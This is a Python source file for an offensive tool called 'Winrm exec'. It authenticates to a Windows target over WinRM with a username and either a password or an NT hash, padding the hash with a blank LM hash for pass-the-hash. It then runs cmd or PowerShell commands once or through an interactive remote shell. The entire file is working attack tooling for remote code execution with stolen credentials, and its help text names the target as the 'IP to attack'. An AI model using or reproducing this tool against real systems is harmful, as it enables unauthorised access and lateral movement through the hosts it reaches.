import argparse
import sys
import readline

try: # pywinrm is a nondefault package
    import winrm
except ModuleNotFoundError:
    print("you are missing the winrm modeule install it with 'pip3 install pywinrm'")
    sys.exit(1)


lmhash = 'aad3b435b51404eeaad3b435b51404ee:' # blank lm hash

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Winrm exec")
    parser.add_argument("target", action='store', help="IP to attack")
    parser.add_argument("command", nargs='?', action='store', help="Command to run shellless (optional)")
    parser.add_argument("-u", required=True, action='store', help="Username")
    parser.add_argument("-p", action='store', help="Password")
    parser.add_argument("-H", action='store', help="NThash")
    parser.add_argument('-d', action='store', type=str, help='Domain name for authentication')
    parser.add_argument('-c', action='store', default ='cmd', choices=['cmd', 'powershell'], help='Which cmd type to use {cmd,powershell} Default=cmd')
    parser.add_argument('-timeout', action='store', default=120, type=int, help='Max timeout before closing the shell if the command takes too long in seconds Default=120')
    parser.add_argument('-debug', action='store_true', help='Enable debugging')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.p is None and options.H is None:
        print('Missing password/nthash')
        sys.exit(1)

    if options.p is not None:
        passwordtoauth = options.p
    else:
        if options.H.startswith(lmhash) and options.H.find(':') != -1:
            passwordtoauth = options.H
        else:
            passwordtoauth = lmhash + options.H.strip().replace(':', '')
            if options.debug:
                print(f'It appears you provided an nt hash with no lm so i added the lm for you your new authentication hash is\n{passwordtoauth}')


    if options.d is not None: # if they provide a domain name it needs to be in the format of domain\username when we send the auth
        username = options.d + '\\' + options.u
    else:
        username = options.u

    if options.debug:
        print(f'username: "{username}" Password: "{passwordtoauth}"')

    session = winrm.Session(options.target, auth=(username,passwordtoauth), transport='ntlm', server_cert_validation='ignore', operation_timeout_sec=options.timeout, read_timeout_sec=options.timeout+round(options.timeout/2))

    if options.command is None:
        uname = session.run_cmd('echo %userdomain%\\%username%') # this is solely to get the username so the console looks nicer

        if uname.std_err != b'':
            print(f'"{uname.std_err.decode()}"')
            print('Error occurred soz')
            sys.exit(1)

        uname = uname.std_out.decode().replace('\n', '').replace('\r', '').strip()
        print('Use "exit" to quit')
        while True: # cmd loop

            try:
                inm = input(f'{uname} > ')
            except KeyboardInterrupt: # prevent ctrl c from killing the shell
                print()
                continue

            if inm == '': # ensure the input is not blank
                continue

            if options.debug:
                print(f'Running command: "{inm}"')

            if inm.lower() == 'exit':
                print("Bye")
                break
                
            if options.c == 'cmd': # cmd vs powershell check
                cmdout = session.run_cmd(inm)
            else:
                cmdout = session.run_ps(inm)

            if cmdout.std_out != b'':
                print(cmdout.std_out.decode())

            if cmdout.std_err != b'':
                print(cmdout.std_err.decode())

    else: # shellless execution
        print(f'Running command: "{options.command}"')
        if options.c == 'cmd':
            cmdout = session.run_cmd(options.command)
        else:
            cmdout = session.run_ps(options.command)

        if cmdout.std_out != b'':
            print(cmdout.std_out.decode())

        if cmdout.std_err != b'':
            print(cmdout.std_err.decode())
